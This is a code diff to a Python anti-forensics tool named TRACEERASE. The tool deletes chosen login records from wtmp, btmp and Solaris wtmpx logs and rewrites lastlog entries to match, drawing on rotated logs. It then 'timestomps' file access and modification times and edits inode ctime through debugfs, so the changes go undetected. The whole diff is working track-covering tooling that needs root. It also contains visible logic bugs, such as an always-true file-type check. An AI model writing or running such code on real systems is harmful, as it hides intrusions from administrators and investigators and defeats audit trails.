@@ -2,9 +2,11 @@
 
 import os, subprocess, argparse, hashlib, struct, random, platform, sys, curses, calendar
 from datetime import datetime, timedelta
-from time import sleep, mktime
+from time import sleep, mktime, strptime
 from shutil import copyfile, which
 from collections import namedtuple
+from getpass import getuser
+from pwd import getpwnam
 try:
     #Text styling
     from colorama import Fore, Style
@@ -30,12 +32,18 @@ args = parser.parse_args()
 #Constants
 UTMP_STRUCT = struct.Struct('hi32s4s32s256shhiii4i20s') #utmp struct
 UTMPX_STRUCT = struct.Struct('32s4s32sih6xiii20x2x16s20x222x') #utmpx struct
-LASTLOG_STRUCT = struct.Struct('hh32s256s') #lastlog struct
+LINUX_LASTLOG_STRUCT = struct.Struct('=l32s256s') #linux lastlog struct
+LINUX_LASTLOG_STRUCT_WRITE = '=l32s256s'
+SUN_LASTLOG_STRUCT = struct.Struct('=l8s16s') #sunos lastlog struct
+SUN_LASTLOG_STRUCT_WRITE = '=l8s16s'
 UTMP_FILES = ['/var/log/btmp','/var/log/wtmp']
 UTMPX_FILES = ['/var/share/adm/wtmpx','/var/share/adm/btmpx']
-LASTLOG_FILES = ['/var/log/lastlog','/var/log/faillog']
+LINUX_LASTLOG_FILE = '/var/log/lastlog'
+SUN_LASTLOG_FILE = '/var/share/adm/lastlog'
 BLOCKSIZE = 65536
 UTMPX_RECORD_SIZE = 372
+LINUX_LASTLOG_RECORD_SIZE = 292
+SUN_LASTLOG_RECORD_SIZE = 28
 
 #Global variables
 auto = args.auto
@@ -270,11 +278,13 @@ class UtmpFile:
         self._size = os.path.getsize(self.path)
         self.atime_ns = os.stat(self.path).st_atime_ns
         self.mtime_ns = None
-        self._hash = None
         self.fs = None
         self.fstype = None
         self.lines = []
         self.dirty_lines = []
+        self.cleaned_users = {}
+        self.last_login = {}
+        self.rolled_lines = []
 
         #Get line size
         if self._size % 382 == 0:
@@ -294,11 +304,21 @@ class UtmpFile:
             if self._size / self._line_size != len(self.dirty_lines):
                 self._clean()
                 self._get_mtime()
+                if self.path == '/var/log/wtmp':
+                    self.find_lastline()
+                    last_log = LinuxLastLogFile(self)
                 touchback_am(self)
+                if self.path == '/var/log/wtmp':
+                    touchback_am(last_log)
                 get_fstype(self)
                 touchback_c(self)
+                if self.path == '/var/log/wtmp':
+                    touchback_c(last_log)
             else:
                 wiper(self.path)
+                if self.path == '/var/log/wtmp':
+                    self.find_lastline()
+                    last_log = LinuxLastLogFile(self)
         elif self._select() == None:
             print(bad+self.path+' has not been changed because no dirty lines were selected!')
         sleep(1)
@@ -316,7 +336,7 @@ class UtmpFile:
         #Get strings version for pager
         with open(self.path, 'rb') as f:
             buf = f.read()
-            for i, entry in enumerate(self._read(buf)):
+            for entry in self._read(buf):
                 line = entry.user+'    '+entry.line+'    '+entry.host+'    '+str(entry.time)
                 self.lines.append(line)
 
@@ -329,12 +349,18 @@ class UtmpFile:
             print(status+'The following lines will be removed:\n')
             for key in bad_list:
                 print(key, bad_list[key])
+                ll_list = bad_list[key].split()
+                try:
+                    self.cleaned_users[getpwnam(ll_list[0]).pw_uid] = ll_list[0]
+                except KeyError:
+                    pass
             while True:
                 a = input('\n'+status+'Do you want to continue? (y/n) ')
                 if a == 'y':
                     return 1
                 elif a == 'n':
                     print(status+'Reopening file...')
+                    self.cleaned_users.clear()
                     sleep(1)
                     break
                 else:
@@ -356,15 +382,64 @@ class UtmpFile:
             sleep(0.5)
             print(status+'Automatically adding new entries to cleaned log...')
             with open(self.path, 'rb') as f:
-                f.seek(self._size, 1)
+                f.seek(self._size)
                 for line in f:
                     self.clean_binary.append(line)
+                f.seek(self._size)
+                for entry in self._read(f.read()):
+                    line_ = entry.user+'    '+entry.line+'    '+entry.host+'    '+str(entry.time)
+                    self.clean_list.append(line_)
         with open(self.path, 'wb') as f:
             for line in self.clean_binary:
                 f.write(line)
-        sleep(1)
-        print(success,+self.path+' is cleaned')
-        sleep(1)
+        sleep(0.5)
+        print(success+self.path+' is cleaned')
+
+    def find_lastline(self):
+        for uid in self.cleaned_users:
+            if self.clean_list != []:
+                for line in reversed(self.clean_list):
+                    if self.cleaned_users[uid] in line.split()[0]:
+                        self.last_login[uid] = line
+                        break
+                    else:
+                        #Read through rolled logs
+                        next_log = 1
+                        while len(self.last_login) < len(self.cleaned_users):
+                            rolled_path = self.path + '.' + str(next_log)
+                            if os.path.isfile(rolled_path):
+                                with open(rolled_path, 'rb') as f:
+                                    buf = f.read()
+                                    for entry in self._read(buf):
+                                        line = entry.user+'    '+entry.line+'    '+entry.host+'    '+str(entry.time)
+                                        self.rolled_lines.append(line)
+                                for line in reversed(self.rolled_lines):
+                                    if self.cleaned_users[uid] in line.split()[0]:
+                                        self.last_login[uid] = line
+                                        break
+                                next_log += 1
+                            else:
+                                self.last_login[uid] = b'\x00' * LINUX_LASTLOG_RECORD_SIZE
+                                break
+            else:
+                #Read through rolled logs
+                next_log = 1
+                while len(self.last_login) < len(self.cleaned_users):
+                    rolled_path = self.path + '.' + str(next_log)
+                    if os.path.isfile(rolled_path):
+                        with open(rolled_path, 'rb') as f:
+                            buf = f.read()
+                            for entry in self._read(buf):
+                                line = entry.user+'    '+entry.line+'    '+entry.host+'    '+str(entry.time)
+                                self.rolled_lines.append(line)
+                        for line in reversed(self.rolled_lines):
+                            if self.cleaned_users[uid] in line.split()[0]:
+                                self.last_login[uid] = line
+                                break
+                        next_log += 1
+                    else:
+                        self.last_login[uid] = b'\x00' * LINUX_LASTLOG_RECORD_SIZE
+                        break
 
     def _get_mtime(self):
         offset = 0
@@ -398,17 +473,72 @@ class UtmpRecord(namedtuple('utmprecord','type pid line id user host exit0 exit1
     def mtime_ns(self):
         return str(self.sec) + str(self.usec)
 
+class LinuxLastLogFile:
+    def __init__(self, log):
+        self._log = log
+        self.path = LINUX_LASTLOG_FILE
+        self._size = os.path.getsize(self.path)
+        self.atime_ns = os.stat(self.path).st_atime_ns
+        self.mtime_ns = None
+        self.fs = None
+        self.fstype = None
+        self._main()
+
+    def _main(self):
+        print(status+'Automatically matching '+self.path+' to '+self._log.path+'...')
+        self._clean()
+        print(success+self.path+' is cleaned!')
+        get_fstype(self)
+        self._get_mtime()
+
+    def _clean(self):
+        with open(self.path, 'rb+') as f:
+            for uid in self._log.last_login:
+                if self._log.last_login[uid] != b'\x00' * LINUX_LASTLOG_RECORD_SIZE:
+                    if len(self._log.last_login[uid].split()) == 5:
+                        _, last_term, last_host, last_date, last_time = self._log.last_login[uid].split()
+                    elif len(self._log.last_login[uid].split()) == 4:
+                        _, last_term, last_date, last_time = self._log.last_login[uid].split()
+                        last_host = '\x00'
+                    if '.' in last_time:
+                        last_time, _ = last_time.split('.')
+                    last_datetime = last_date+' '+last_time
+                    pattern = '%Y-%m-%d %H:%M:%S'
+                    epoch = int(mktime(strptime(last_datetime, pattern)))
+                    f.seek(uid * LINUX_LASTLOG_RECORD_SIZE)
+                    f.write(struct.pack(LINUX_LASTLOG_STRUCT_WRITE, epoch, bytes(last_term, 'ascii'), bytes(last_host, 'ascii')))
+                else:
+                    f.seek(uid * LINUX_LASTLOG_RECORD_SIZE)
+                    f.write(self._log.last_login[uid])
+
+    def _get_mtime(self):
+        logins = []
+        with open(LINUX_LASTLOG_FILE, 'rb') as f:
+            buf = f.read()
+        offset = 0
+        while offset < len(buf):
+            epoch, _, _ = LINUX_LASTLOG_STRUCT.unpack_from(buf, offset)
+            if epoch != 0:
+                logins.append(epoch)
+            offset += LINUX_LASTLOG_STRUCT.size
+        self.mtime_ns = str(max(logins))
+        while len(self.mtime_ns) < 19:
+            rand = random.randint(0,9)
+            self.mtime_ns += str(rand)
+
 class UtmpxFile:
     def __init__(self, path):
         self.path = path
         self._size = os.path.getsize(self.path)
         self.atime_ns = os.stat(self.path).st_atime_ns
         self.mtime_ns = None
-        self._hash = None
         self.fs = None
         self.fstype = None
         self.lines = []
         self.dirty_lines = []
+        self.cleaned_users = {}
+        self.last_login = {}
+        self.rolled_lines = []
 
         self._hash = get_hash(self.path, UTMPX_RECORD_SIZE)
         self._main()
@@ -418,16 +548,25 @@ class UtmpxFile:
         print(status+'Opening '+self.path+'...')
         sleep(1.5)
         curses.wrapper(Screen, self)
-        
         if self._select() == 1:
             if self._size / UTMPX_RECORD_SIZE != len(self.dirty_lines):
                 self._clean()
                 self._get_mtime()
+                if self.path == '/var/share/adm/wtmpx':
+                    self.find_lastline()
+                    last_log = SunLastLogFile(self)
                 touchback_am(self)
+                if self.path == '/var/share/adm/wtmpx':
+                    touchback_am(last_log)
                 get_fstype(self)
                 touchback_c(self)
+                if self.path == '/var/share/adm/wtmpx':
+                    touchback_c(last_log)
             else:
                 wiper(self.path)
+                if self.path == '/var/share/adm/wtmpx':
+                    self.find_lastline()
+                    last_log = LinuxLastLogFile(self)
         elif self._select() == None:
             print(bad+self.path+' has not been changed because no dirty lines were selected!')
         sleep(1)
@@ -458,12 +597,18 @@ class UtmpxFile:
             print(status+'The following lines will be removed:\n')
             for key in bad_list:
                 print(key, bad_list[key])
+                ll_list = bad_list[key].split()
+                try:
+                    self.cleaned_users[getpwnam(ll_list[0]).pw_uid] = ll_list[0]
+                except KeyError:
+                    pass
             while True:
                 a = input('\n'+status+'Do you want to continue? (y/n) ')
                 if a == 'y':
                     return 1
                 elif a == 'n':
                     print(status+'Reopening file...')
+                    self.cleaned_users.clear()
                     sleep(1)
                     break
                 else:
@@ -485,15 +630,64 @@ class UtmpxFile:
             sleep(0.5)
             print(status+'Automatically adding new entries to cleaned log...')
             with open(self.path, 'rb') as f:
-                f.seek(self._size, 1)
+                f.seek(self._size)
                 for line in f:
                     self.clean_binary.append(line)
+                f.seek(self._size)
+                for entry in self._read(f.read()):
+                    line_ = entry.user+'    '+entry.line+'    '+entry.host+'    '+str(entry.time)
+                    self.clean_list.append(line_)
         with open(self.path, 'wb') as f:
             for line in self.clean_binary:
                 f.write(line)
-        sleep(1)
+        sleep(0.5)
         print(success+self.path+' is cleaned')
-        sleep(1)
+
+    def find_lastline(self):
+        for uid in self.cleaned_users:
+            if self.clean_list != []:
+                for line in reversed(self.clean_list):
+                    if self.cleaned_users[uid] in line.split()[0] and 'USER_PROCESS' in line:
+                        self.last_login[uid] = line
+                        break
+                    else:
+                        #Read through rolled logs
+                        next_log = 0
+                        while len(self.last_login) < len(self.cleaned_users):
+                            rolled_path = self.path + '.' + str(next_log)
+                            if os.path.isfile(rolled_path):
+                                with open(rolled_path, 'rb') as f:
+                                    buf = f.read()
+                                    for entry in self._read(buf):
+                                        line = entry.user+'    '+entry.line+'    '+entry.host+'    '+str(entry.time)
+                                        self.rolled_lines.append(line)
+                                for line in reversed(self.rolled_lines):
+                                    if self.cleaned_users[uid] in line.split()[0] and 'USER_PROCESS' in line:
+                                        self.last_login[uid] = line
+                                        break
+                                next_log += 1
+                            else:
+                                self.last_login[uid] = b'\x00' * SUN_LASTLOG_RECORD_SIZE
+                                break
+            else:
+                #Read through rolled logs
+                next_log = 0
+                while len(self.last_login) < len(self.cleaned_users):
+                    rolled_path = self.path + '.' + str(next_log)
+                    if os.path.isfile(rolled_path):
+                        with open(rolled_path, 'rb') as f:
+                            buf = f.read()
+                            for entry in self._read(buf):
+                                line = entry.user+'    '+entry.line+'    '+entry.host+'    '+str(entry.time)
+                                self.rolled_lines.append(line)
+                        for line in reversed(self.rolled_lines):
+                            if self.cleaned_users[uid] in line.split()[0] and 'USER_PROCESS' in line:
+                                self.last_login[uid] = line
+                                break
+                        next_log += 1
+                    else:
+                        self.last_login[uid] = b'\x00' * SUN_LASTLOG_RECORD_SIZE
+                        break
 
     def _get_mtime(self):
         offset = 0
@@ -542,6 +736,65 @@ class UtmpxRecord(namedtuple('utmpxrecord','user id line pid ut_type sec usec se
     def mtime_ns(self):
         return str(self.sec) + str(self.usec)
 
+class SunLastLogFile:
+    def __init__(self, log):
+        self._log = log
+        self.path = SUN_LASTLOG_FILE
+        self._size = os.path.getsize(self.path)
+        self.atime_ns = os.stat(self.path).st_atime_ns
+        self.mtime_ns = None
+        self.fs = None
+        self.fstype = None
+        self._main()
+
+    def _main(self):
+        print(status+'Automatically matching '+self.path+' to '+self._log.path+'...')
+        self._clean()
+        print(success+self.path+' is cleaned!')
+        get_fstype(self)
+        self._get_mtime()
+
+    def _clean(self):
+        with open(self.path, 'rb+') as f:
+            for uid in self._log.last_login:
+                if self._log.last_login[uid] != b'\x00' * SUN_LASTLOG_RECORD_SIZE:
+                    print(self._log.last_login[uid])
+                    if len(self._log.last_login[uid].split()) == 6:
+                        _, _, last_host, last_date, last_time, _ = self._log.last_login[uid].split()
+                        last_term = 'ssh'
+                    elif len(self._log.last_login[uid].split()) == 5:
+                        _, last_term, last_date, last_time, _ = self._log.last_login[uid].split()
+                        last_host = '\x00'
+                    last_datetime = last_date+' '+last_time
+                    pattern = '%Y-%m-%d %H:%M:%S'
+                    epoch = int(mktime(strptime(last_datetime, pattern)))
+                    '''
+                    #looks like the wtmpx file keeps nanosecond timestamps for pts, check if in lastlog
+                    if '.' in last_time:
+                        last_time, last_time_ns = last_time.split('.')
+                        epoch = str(epoch+last_time_ns)
+                    '''
+                    f.seek(uid * SUN_LASTLOG_RECORD_SIZE)
+                    f.write(struct.pack(SUN_LASTLOG_STRUCT_WRITE, epoch, bytes(last_term, 'ascii'), bytes(last_host, 'ascii')))
+                else:
+                    f.seek(uid * SUN_LASTLOG_RECORD_SIZE)
+                    f.write(self._log.last_login[uid])
+
+    def _get_mtime(self):
+        logins = []
+        with open(SUN_LASTLOG_FILE, 'rb') as f:
+            buf = f.read()
+        offset = 0
+        while offset < len(buf):
+            epoch, _, _ = SUN_LASTLOG_STRUCT.unpack_from(buf, offset)
+            if epoch != 0:
+                logins.append(epoch)
+            offset += SUN_LASTLOG_STRUCT.size
+        self.mtime_ns = str(max(logins))
+        while len(self.mtime_ns) < 19:
+            rand = random.randint(0,9)
+            self.mtime_ns += str(rand)
+
 class AsciiFile:
     #Just need the file path to start
     def __init__(self, path):
@@ -559,7 +812,7 @@ class AsciiFile:
 
     def _main(self):
         self._make_list()
-        print(status+'Opening'+self.path+'...')
+        print(status+'Opening '+self.path+'...')
         sleep(1.5)
         curses.wrapper(Screen, self)
 
@@ -648,7 +901,8 @@ def logo():
    | | | |_) |  / _ \| |   |  _| |  _| | |_) |  / _ \ \___ \|  _|  
    | | |  _ <  / ___ \ |___| |___| |___|  _ <  / ___ \ ___) | |___ 
    |_| |_| \_\/_/   \_\____|_____|_____|_| \_\/_/   \_\____/|_____|
-                                                                   
+                              0.1.0.0                              
+
     ''')
 
 def get_os():
@@ -706,11 +960,8 @@ def get_linux_logs():
         except IOError: # proc has already terminated
             continue
 
-    for log in LASTLOG_FILES:
-        if os.path.getsize(log) == 0:
-            log_files[log] = 'empty'
-        elif os.path.isfile(log) and get_file_type(log) == 'data':
-            log_files[log] = 'lastlog'
+    if os.path.getsize(LINUX_LASTLOG_FILE) == 0:
+        log_files[LINUX_LASTLOG_FILE] = 'empty'
     sleep(2)
     print(success+str(len(log_files))+' logs discovered!')
     sleep(1)
@@ -734,7 +985,7 @@ def get_file_type(path):
 
     if 'ASCII' in str(stdout):
         return 'ASCII'
-    elif 'data' in str(stdout):
+    elif 'data' or 'dBase' in str(stdout):
         return 'data'
     elif 'empty' in str(stdout):
         return 'empty'
@@ -761,7 +1012,7 @@ def wiper(log):
 
 def touchback_am(log):
     #Gotta find latest remaining entry to the log to change the mtime back to that point
-    print(status+'Timestomping atime and mtime...')
+    print(status+'Timestomping '+log.path+' atime and mtime...')
     sleep(1)
     os.utime(log.path, ns=(log.atime_ns, int(log.mtime_ns)))
     print(success+'Success!')
@@ -799,7 +1050,7 @@ def touchback_c(log):
         print(success+'Log is stored on '+log.fstype+' filesystem and debugfs is present, ctime can be changed!')
         get_ctime(log)
         while True:
-            proceed = input('\nDo you want to use the native debugfs binary to edit the inode table? (y/n) ')
+            proceed = input('\nDo you want to use the native debugfs binary to edit the inode table for '+log.path+'? (y/n) ')
             if proceed == 'y':
                 #Use debugfs to adjust ctime
                 print('\n'+status+'Stomping ctime...')
@@ -822,10 +1073,10 @@ def touchback_c(log):
                 print(success+'All timestamps are stomped!')
                 break
             elif proceed == 'n':
-                print('\n'+bad+' ctime remains unchanged and will not match mtime, should be fine...')
+                print('\n'+bad+'ctime remains unchanged and will not match mtime, should be fine...')
                 break
             else:
-                print('\n',fail,'Invalid option entered!')
+                print('\n'+fail+'Invalid option entered!')
                 continue
     elif 'ext' in log.fstype and not which('debugfs'):
         print(bad+'Log is stored on '+log.fstype+' filesystem, but debugfs is not present, '
@@ -840,6 +1091,9 @@ def get_ctime(log):
     log.ctime_extra = str(int(str(log.mtime_ns)[-9:]) * 4)
 
 def main():
+    if getuser() != 'root':
+        print(fail+'Script must be run as root!')
+        exit()
     if auto:
         logo()
         #Find logs based on OS and user input
@@ -869,7 +1123,9 @@ def main():
         elif os.path.isfile(log_file) and get_file_type(log_file) == 'data' and log_file in UTMP_FILES:
             binary_log = UtmpFile(log_file)
         elif os.path.isfile(log_file) and get_file_type(log_file) == 'data' and log_file in UTMPX_FILES:
-            binary_log = UtmpxFile(log_file)        
+            binary_log = UtmpxFile(log_file)
+        elif os.path.isfile(log_file) and get_file_type(log_file) == 'data' and log_file == LINUX_LASTLOG_FILE:
+            binary_log = LinuxLastLogFile(log_file)        
         elif get_file_type(log_file) == 'empty':
             print(fail+log_file+' is empty! You\'re probably safe here...')
         else:
@@ -885,5 +1141,5 @@ if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print('\n'+status+'Interrupted! Closing TRACEERASE...')
+        print('\n'+bad+'Interrupted! Closing TRACEERASE...')
         exit()
